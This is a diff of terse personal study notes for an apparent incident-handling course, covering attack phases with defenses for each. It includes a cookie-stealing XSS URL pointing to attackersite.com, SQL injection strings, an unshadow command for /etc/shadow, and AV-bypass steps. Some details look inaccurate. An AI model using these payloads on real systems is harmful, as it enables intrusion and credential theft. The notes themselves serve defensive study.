@@ -24,7 +24,7 @@ TOOLS: whois data, reverse whois, viewdns, entrust-ctsearch, hibp, SpiderFoot, n
 
 Step 2: Scan - GOAL: survey tgt for holes
 
-War Dial: dial #’s in seq to locate modem carrier/2nd dial tone, remote access to routers (oob), attack vmail
+War Dial: dial #’s in seq>find modem/2nd dial tone, r.access to routers (oob), atck vmail
 WarVox: VoIP w/ ID spoof, 1000/8hr, signatures apple against audio, spectrum analysis,
 DEFENSES: 
 
@@ -35,8 +35,9 @@ TOOLS: WarVox,
 
 Step 3: Exploit - GOAL: gain access/deny others
 
-Physical Attacks: steal pc, bypass local ctrl (HDD encrypt), usb boot attack, rubber ducky (HID)
+Physical Attacks: steal pc, bypass local ctrl (HDD encr), usb boot atck, rubber ducky
 DEFENSES: [P] use full-disk encrypt, restrict USB ports, user train(lock pc), pwd BIOS (stops alt media boot), disable LLMNR (stops lan+turtle+responder attacks)
+
 NetCat: r/w data ax network, only one cnx per listener, stdin+stdout+stderr both same
 [C]lient: initiates cnx
 [L]istener: waits for cnx
@@ -110,12 +111,12 @@ BetterCap= auto disc tgt + ARPcache poison+ hijack traff
 Manipulate IP>MAC map + reroute packet to attacker pc
 MITMf = intercept HTTPS w/ SSLStrip+, insert mal .hta, BeEF, Responder
 ARP cache poison = ip fwd+ARP request+sniff (act as DG)
-NetworkMinder=live net analysis+offline pcap analyze  (thumbnail)
+NetworkMiner=live net analysis+offline pcap analyze  (thumbnail)
 
 
 
 SSHmitm gives public key for SSH server (tgt>attkr + attkr>server)
-Dodge SSL Warnings: comp CA/RA + bleed key fom mem + bogus cert+MD5 hash collision on trusted cert
+Dodge SSL Warnings: comp CA/RA + bleed key from mem + bogus cert+MD5 hash collision on trusted cert
 comp browser + import attkr cert as trusted
 user accept cert via SE/popup/etc
 MITM + force browser to use HTTP not HTTPs (bettercap SSLstrip)
@@ -132,6 +133,7 @@ Serve malicious .exe files + force LANMAN downgrade (ez2crack)
 	
 WPAD attack=make ID of proxy transparent to user
 pretend to be WPAD>serve mal PAC file (use your proxy for all traffic)
+
 DEFENSES: [P] port-level security on switches, dynamic ARP inspection with DHCP snooping, disable LLMNR and WPAD, encrypt sessions + strong auth, SSH v2+, VPN+encryption, [I] broken ARP entries, check local machine (arp -a), monitor LAN via ARPwatch, check switch logstash (camtableexport.ps1), check DNS cache on win (ipconfig /displaydns), error messages from ssh clients, [C] drop spurious sessions, change pwd+restart srvc, analyze dest sys, [E/R]: change pwd, rebuild sys
 
 Buffer Overflows: stuffing large data into small receptacles (some local/ax net)
@@ -150,7 +152,7 @@ hardest part of creating BoF
 doesn’t know which mem location of malcode > guess via dbg
 
 [stack] like a scratchpad to store things to rmr
-LIFO (last in first out) + pust on top of stack + pop from top 
+LIFO (last in first out) + push on top of stack + pop from top 
 RP has addr where funk interrupt was = where we wana go post-funk
 buffer>neighbor var space>pointer space (new addr for RP to malcode)
 1 (use existing BoF code) or 2 (create 0day)
@@ -168,6 +170,11 @@ ASCII null (0x00) stops vuln [strcpy] from write+ncode xploit to avoid filter
 used to detect these attacks on the net
 NOP sled + mal code + RP = egg 
 
+[canaries] hash of RP+place on stack + check canary match RP after funk call
+else, don’t return from funk, crash gracefully 
+3 types: random/XOR/terminator (don’t carry over part of cpy funk)
+
+DEFENSES: [P] patch; obtain/test, host-based IPS (block certain calls into kernel from apps + mem protect areas like stack), app whitelisting software, no instructions from stack (may break apps), SELinux ext mitigate impact of ware based exploits, Win Defender Exploit Guard (DEG), Win Data Exe Prev (DEP), hw/sw based DEP (hw stronger+supports only processors that exe protect (NX)), software is default for programs/srvs, canaries (added to compiler, not OS) + hash of RP, check size of user input, truncate data or give error if too big, c/c++ rely on programmer to manage mem, awareness/training for devs, tools (RATS, flawfinder, SWAMP, etc) [I] unusual server crash, exe of code from stack, IDS/IPS alerts, extra accounts on sys, [C] deploy non-exe sys stacks, patch, [E] patch, rebuild, [R] monitor after back in prod
 
 Metasploit: exploit framework, exploit+payload+tgt (dest IP addr/port/options)
 [modules]: (select exploit+tgt+payload+options/launch)
@@ -182,16 +189,310 @@ no separate proc (no cmd.exe)
 no touching HDD
 no sys cmd exe for shell (all hosted)
 easy growth via adding new DLLs
-	
+displays sys info (OS/uid/etc)+interact w/ FS (cd/ls/upload/download/etc)
+interact w/ net (config/build port relay) + procs (exe/kill/ps) + uses TLS (encrypts traffic)
+Multisession+in mem proc migration+disable k/m input+keylog+sniff+encode+piv
+payload+enc/denc+random NOP generator+wrapper for shellcode+offsets+msfelfscan/msfepscan(search exe/lib for vulns)
+[why] - builtin ft + 1000+ exploits + payload in firework + devs add exploits
+
+DEFENSES: [P] ctrl outgoing traffic, filter both directions, use proxies, DNS/HTTP/HTTPS/SSH careful, hunt team, check long URLs, DNS entries on blacklists, beacons, odd services/exes
+
+Protocol Parsers: often run with root priv + attach to port # >1024 on UNIX + syslvl funk
+lack of bounds check 
+
+DEFENSES: [P] patch
 
 
-TOOLS: konboot, inception, LAN turtle+responder, rubber ducky, netcat, wireshark/tshark, solaris, LLMNR, NBT-NS, BetterCap, ARPSpoof, MITMf, Backdoor Factory, BDF proxy, ScreenShotter, JSKeylogger, NetworkMiner, SSHmitm, Pacdoor, ARPwatch,
+Endpoint Bypass: AV bypass+app whitelist bypass+ AVNG bypass + non-attribution
+[Veil] generate a meterpreter payload as BAT file to embed word macro
+[ghostwrite] mods assembly of exe to bypass AV (+2-2) + NOP is enough
+[app whitelist] add malcode in code caves + envrmt keyed payloads + golang payloads + code sign malcode + live off the land (LOL)
+atbroker.exe used by create regkey for mal.exe + 2 regkey w/ REG_DWORD value of 0 + startexe w/ malcode path + invoke mal.exe via atbroker
+hijack install/uninstall funk of exe to bypass some sandbox tools
+
+
+TOOLS: konboot, inception, LAN turtle+responder, rubber ducky, netcat, wireshark/tshark, solaris, LLMNR, NBT-NS, BetterCap, ARPSpoof, MITMf, Backdoor Factory, BDF proxy, ScreenShotter, JSKeylogger, NetworkMiner, SSHmitm, Pacdoor, ARPwatch, !exploitable, 
+RATS, Flawfinder, SWAMP, Fortify source code analyzer, Coverity Static analysis, Klocwork insight pro, grammatech’s CodeSonar
 
 Step 4: Keep Access - GOAL: stay there
-DEFENSES: live with it
+
+Password Attacks: pwd 1st/only LOD + unauth disclosure/mods/rm
+pwd guess: find valid uid+ ls pwds + try + use scripts = trigger acc lkout
+pwd spray: small pwd set against large acc set (e.g, Summer2020)
+THC Hydra: pwd guess+dict support+ ✔protocol(ssh/rdp/smpt/vnc+)+*nix
+pwd crack: get ptxt pwd = pwd file w/ ctxt rep of pwds
+find valid uid+find encry algo+get encry pwd+ls pwds+hash+check match
+create dict + combo terms/pwd + automate/optimize
+dict(wrdlist)+bforce(iterate char set)+hybrid(mix d+b)/word mangle
+recover forgot/unk pwd + audit pwd strength + no store crack pwd +chg+
+
+Password Hashes: win(LANMAN/NT)+ *nix (des/3des/md5/blowfish/sha256/sha512)
+auth= choose pwd + hash tht pwd + store that value *cpu heavy=b/scrypt/pbkdf2*
+user logs in + sys calcs hash = hash’ then sys check hash’ to value=auth!
+
+LANMAN: legacy+bforce 4Core(alph# <2h, alph#+somesym <10h, alph+allsym=<120h)
+not case sensitive (all uppercase)
+pwd padded to 14b + add NULL (0x00)b to end of str
+split two 7b chunks + encr DES key (KGS!+#$%) + concat = LANMAN hash
+no salt
+
+NT Hash: modern+case sense+unicode+MD4 hash+encr RC4 or AES-CBC-128 in SAM
+<14 char = no LANMAN hash is stored, only NT for local auth
+no salt (likely to maintain compat w/ legacy auth prots)
+
+Salt: adds entropy (randomness) + makes it harder to crack
+randomly selected + not secret + OS auto adds when calc pwd hash
+must be ptxt with pwd hash = so sys can use same salt to auth usr pwd
+defeats rainbow tables attk 
+
+Rainbow Tables: hash pwd table (store RAM or idx file HDD, map hash>pwd + cpu)
+DEFENSES: salt pwds 
+
+Get WinDC Hash: get NTDS.dit (its encr) + SYS registry hive data + secretsdump.py
+1>built-in tool ntdsutil.exe lets atkr backup AD (activate instance ntds + ifm)
+2>decryp NTDS.dit via secretsdump.py 
+less likely to trigger alert 
+
+Get Win10 hash: mtrprtr: hashdump(reads local pwd from lsass) + smart_hashdump
+1>hashdump (old sys migrate PID in lsass) + (new sys migrate -N lsass.exe)
+2>smart_hashdump: reads pwd from HDD
+find SYS proc (not svchost > may crash) + match architecture (x64/x86)
+migrate PID 
+choose: lsass may be incomplete/limited to local users + smart_hd fails UAC 
+
+Win Hashes: username:userid:LANMAN:NTHASH
+empty hash= older tools/change win encr ft/disabled prot/inactive acc/cant dcrt SAM
+empty = am all day baffled  by : difficult choices for encryp data
+
+Unix/Linux pwd: early sys pwd with DES encr (no salts) + uname/pwd in /etc/pwd file
+later, MD5 pwd hash, follow BlowFish, SHA256/512, (salt; 4b/8b)
+uname in /etc/pwd (world readable) 
+hash type + salt (4/8 char) + crypt() enc pwd hash in /etc/shadow 
+no$(DES), $1(MD5), $2(Blowfish), $5(SHA256), $6(SHA512)
+$hash funk+salt+hashvalue:
+attkr can take salt (/etc/shadow) + words = hash’ to auth 
+
+Hash Rounds: slow pwd cracks (prior hash is input to the next hash calc - serially (5k x))
+MD5 ($1) = 1k rounds
+SHA256($5) + SHA512($6) = 5k rounds
+use GPUs 
+DEFENSES: [P] use PBKDF2 which allows HMAC, bcrypt, scrypt,
+
+
+PBKDF2: pwd hash funk + specific HMAC (hash msg auth chk) + some sys 1m rounds
+WPA/WPA2 uses PBKDF2 for PKS w/ 4096 SHA1 rounds
+
+John: xplatf + feed encr pwd file + for Win give output of Mtrptr/mimikatz/impacket
+supports/autod pwd hash format + cracked pwd print to screen + store john.pot
+steps: cpy dirs to /tmp + combine via unshadow file combined + run john combined
+rm john.pot file when pwd audit done
+Default: single>wordlist>incremental
+single; variation of uid + /etc/pwd info +
+wordlist; wrdlist file + hybrid = permutate pwd 
+incremental; bforce 
+external; ext program to generate pwds
+
+# unshadow /etc/passwd /etc/shadow > combined
+
+HashCat: crack many via -n (office file pwd/kerb tkt via kerbroasting/os hash)
+uses GPUs 
+multi-mode attk
+rule engines for pwd mutation atks
+attk modes: straight (-a 0), comb (-a 1), bforce/mask(-a 3), hy/w/m(-a 6), hy/m/w(-a 7)
+rule files mutate wlist 
+toggle case of each letter in words
+replaces [e] with [3] (l33t speak)
+reverse words, capitalize 1st letter, add #/char/etc
+
+DEFENSES: [P for Win] rm LANMAN hashes, strong pwd, pwd policy, deploy Mic LAPS+Cred Guard, don’t store LANMAN hash in regkey [hkey_LM\sys\currentControlSet\ctrl\LSA], audit pwd (domain pwd audit tool), group policy w/ AD, pwd length, 20+ char pwds, [P for *nix] PAM (pluggable auth mod), link login to sys (RADIUS,kerberos,etc), pwd complex: passwdqc, pwqcheck, pwqgen
+
+Pass-the-Hash: use hash to auth tgt directly
+Win performs LANMAN Ch/Rsp, NTLMv1/2 auth via hash in LSASS mem 
+grab hashes+load into mem+ auth via SMB
+sys not attach to domain restrict via regkey [LocalAccountTokenFilterPolicy]
+set to 0 = disabled except admin (RID500)
+domains vuln to PTH;
+DEFENSES: [P] maintain ctrl of hash, AV, use host FW+block C>C cnx, allow inbound SMB>C sys only via admin, manage local admin via LAPS and Mic Cred Guard, [I] find unusual admin activity, config changes, unusual SMB + Pc>Pc cnx, [C/E/R] change pwds asap 
+
+Kerberoasting: dom usr request service tkt
+tkt is encr using service pwd hash
+request list of service principal names (SPN) from AD
+GetUserSPNs.py from impacket grabs it
+mimikats/empire/+ can extract tkts
+no need to interact w/ srvc
+no need to exist (srvc), just acct
+good for old/defunct srvc acc + many pwd never expires
+pwd crack via hashcat
+
+Worms: auto attk tools spread via net+stage ground to scan/conquer tgts
+instance = segments
+multi-exploit/platf/0day/fast-spread/polymorphic/metamorphic
+uses xploit warhard to penetrate pc (1 or 2 to date)
+stuxnet had 4 (file explorer 0day, usb infect, etc)
+holes in many net-based apps
+nimda 2001 had a dozen ways
+
+Bots: programs that perform actions on human behalf + specialized bd + ctrl sys en masse
+ctrl large  ~12 - 1m+
+group of bots under control = botnet
+attkr called botherder 
+Maintain bd+control IRC channel+mail relay+anonymize HTTP proxies+DOS
+install bots via worms (bot as payload) + email attach + trojan + browser exploit/driveby
+IRC port 6667/3000/3333 + HTTPS/DNS + social (Twitter/YT/Google Docs)
+morph code for file infection + run cmd with SYS priv 
+start listening sh + add/rm file shares + FTP file + add autostart entry + scan
+launch packet flood (SYN/HTTP/UDP/etc)
+create HTTP proxy (anon surf)
+start GRE/TCP redir
+harvest email addr + load plugin into bot
+shutdown pc/delete bot
+look for virtualization + foil dynamic REM
+DEFENSES: [P] BoF defenses help, harden sys,  process to test/deploy quick patches, app whitelist + software restrict policies/applocker, encr data HDD, tabletop: speed/scope test, [I] AV daily update, logs on desktop/mail server/file server, [C] IR + net mgmt, kick off net segments real-time, [E/R] AV to remove infestation/rebuild
+
+OWASP: open web app sec project + dev guide + pen test frwork/chklist + webGoat+ ZAP 
+
+Account Harvest: find valid UIDs
+how server responses to good vs bad uid auth (error msgs; uid already taken)
+automate via script (shell/wget/python/burp)
+depends on format of uid (numeric; credit cards + user; dict file)
+1 pwd at a time = fly under pwd lockout radar 
+pwd spray
+DEFENSES: [P] consistent auth error msgs, uid bad login metrics, lockout acc, slow down auth (wait 5s) per IP/user agent, [I] frequent auth activity w/ no activity after success login
+
+
+CMD Injection: web app take usr input (malcode) + process + invoke sh 
+priv of web server 
+can be URL/form var/cookies/ input fields etcc
+separated with [ ; ] on *nix, and [ & ] on Win
+shellShock
+1>ping/nslookup  (sniff to see traffic from tgt) 
+dont need highpriv +blind fashion = not seeing output of cmd
+won’t cause harm in envrmnt 
+2>transfer/exe program on tgt + time-delay inference 
+DEFENSES: [P] educate devs, vuln assess, pentest, [I] unusual traffic/extra acct/config chg on servers, [C] fix app, use WAF, remove attkr exe/acc, chk for rtkt, [E] rebuild if rtkt, [R] monitor attkrs return
+
+ping -n 6 -w 1000 127.0.0.1 
+Note: useful to verify cmd inject vuln even if cmd output not available
+
+SQL Inject: backend db + take input/adds to SQL query to get/update/delete data
+find input strg (uname/acc#/product SKU)
+is it integer, strg, date, etc
+add strg quotes
+bypass client-side filters (JScript)
+use web-app manipulate proxy
+db logic elements
+[--] comment delimiter -->ignore anything passed after user input
+avoid syntax errors by sql injections
+[ ;] query terminator
+[*] wildcard selector
+[%] match any substr
+[_] match any char
+use OR, TRUE, 1=1, SELECT, JOIN and UPDATE
+2 types of data 
+user definable table 
+metadata
+union statement merges results of 2 [select] statements
+to view attkrs data from own statement in output fields
+DEFENSES: [P] limit perm of web app access db, filter user input, use parameterized queries! , modSecurity, [I] check logs for special chars, phrases for union,select, join and inner, DLP detect exfil for PII, [C] block src IP/account being exploited, [E/R] rm attkr data, launch fraud INV
+
+select * from users where name = ‘Fred’’;
+Select * from users where name = ‘’ or 1=1; --’;
+
+
+
+XSS: user input sent back to user browser w/o filter 
+steal info (cookies)
+URL in a script > reflected back to client 
+runs on client browser
+search for site w/ no filter user-supplied input, HTML <script> tags
+can pass cookies to attkr site even if grab.cgi doesn’t exist
+
+
+
+hxxp://counterhack.net/search.php?word=<SCRIPT>document.location=’hxxp://attackersite.com/cgi-bin/grab.cgi?’%2bdocument.cookie;</SCRIPT>
+Note: steals cookies ( user clicks link + goes to site + invokes script + sends to tgt site (bank) as web request + malcode exe in browser as tgt site
+
+
+
+Reflected XSS: script reflected off tgt site > users browser
+victim accesses site vuln to XSS
+phish victim
+victim click + browser transmits script to web app as input
+web app reflects input back to browser (script)
+script runs on vic browser (grabs all cookies+send via http/email to attkr)
+
+Stored XSS: script stored on tgt site backend + deliver to victim browser
+can scan internal net 
+
+BeEf: browser exploit framework > ctrl of browser via XSS hook
+beef server + beef hook on xss vuln site 
+victim accesses pg w/ beef hook + victim contacts beef server = ctrl
+port scan/history grabber/sw inventory/alter pg view/msf exploit/xss sh
+
+Attack Admin via XSS: steal admin cookies
+attkr input browser script + app logs this input 
+admin views the app logs + malcode runs (steals cookies)
+could alter app using admin creds + add new attkr admin acct
+DEFENSES: [P] rm user input char (=<>();&) server side, filter quotes, semicolons, asterisks, percent, underscore, other shell metachar, delete/enc from site output, modSecurity, best= define ok chars, [P for client] disable script/browser fts to ctrl script, NoScript ff ext, selective allow plugins via trusted cert site, anti-XSS, sus activity, IE8 include built-in XSS filter, JS in URLs/HTTP POST vars, [P for Server] limit cookie access w/ HttpOnly flag, set Content Security Policy, browser can report to specific URL if attkd, [I] IDS/logs with scripts, enc info (hex/unicode), [C] filter in data, [E] rm attkr data, [R] contact anti-fraud group
+	
+Attack WebApp State Maint: url sesh track + hidden form elements + cookies
+“hold this, give it back to me for all future interactions”
+atkr browser > proxy > internet > web app
+edit raw http/https within proxy (burp/fiddler/zap)
+cover entire app
+web app enc/hash cloned ID > attkr can access app as another user
+
+DEFENSES: [P] use proxy, WAF, monitor elements + in data to/from web app, secureSphere WAF, Citrix netscaler FW, F5 ASM, modSecurity, [I] users complain acct usurpation, [C] advise shutdown app while fix, quarantine victim acc, [E] rm attkr data from victim acct, [R] restore/reset pwd+monitor accs 
+
+DOS: deny legit user from service 
+Local Dos
+1>crash service via stop proc
+2>tie up sys resources
+consume cpu cycles, mem space, HDD space, etc CpuHog
+Network Dos	
+1>malformed packet flood: send single/small packet formed in wrong way
+too long, Ping of Death, strange fragmented aka TearDrop attack
+2>packet flood: send a lot of packets to exhaust all bandwidth of cnx to tgt
+			
+
+DNS Amplification: small spoofed DNS query to several DNS servers
+does not involve broadcast addr
+query dns + dns sends larger response back to addr tht looks like it made request
+results in traffic flood to tgt
+DNS is UDP - spoofing is trivial 
+EDNS: dns qry can specify a larger buffer (<512b) for response
+find several DNS server w/ recursive lookups 
+attkr qry those servers for attkr owned DNS
+attkr respond to qry w/ 4k byte TXT record
+w/ poisoned cache, attkr spoofs DNS req for record w/ tgt src IP
+flood victim
+
+DDOS: many comp pc via botnet (past used Tribe Flood Network 2000)
+attkr can set nc relays to obscure origin
+client pc sends cmds to bots via IRC channel
+Reflected DDOS: attkr bounce flood from botnet>victim
+bots send SYN to legit site (core router etc)
+legit site sends SYN-ACK to flood victim
+difficult to trace
+they think the high bandwidth site is doing the attacking
+	
+Pulsing Zombies, bots flood tgt shortly (mins), then dormant 
+tracing active attk easy, dormant=difficult 
+Evolution: SYN > HTTP floods
+SYN: typical spoof + suck up b/width + easy ISP trace
+HTTP: full 3way handshake + send HTTP GET for common pg (index.html)
+harder to see from normal traffic
+LOIC: low orbit ion cannon + TCP/UDP/HTTP floods 
+HOIC: high orbit: easy+ multithreaded+quick+customize JScripts for +boosters
+
+DEFENSES: [P] host IDS/IPS, patch, AV, egress antispoof filters, critical biz sys w/ redundancy, [I] chk mass flood packets, automate DDOS/throttle tools (peakflow, riverbed, neustar, cloudflare), [C] IR marshal of ISP
+
+
+
+TOOLS: THC Hydra, RainbowCrack, CrackStation, pbkdf2, bcrypt, scrypt, Argon2, john the ripper, hashcat, fgdump, win cred editor (WCE), mod SAMBA code, msf psexec + psexec_psh mods, Burp, OWASP, WebGoat, ZAP, AppSec Wiki Project, Zap proxy, burp, w3af, fiddler, TFN, TFN2k, LOIC,HOIC
+
+
 
 
 Step 5: Cover Tracks - GOAL: stay hidden
 DEFENSES: live with it
-
-
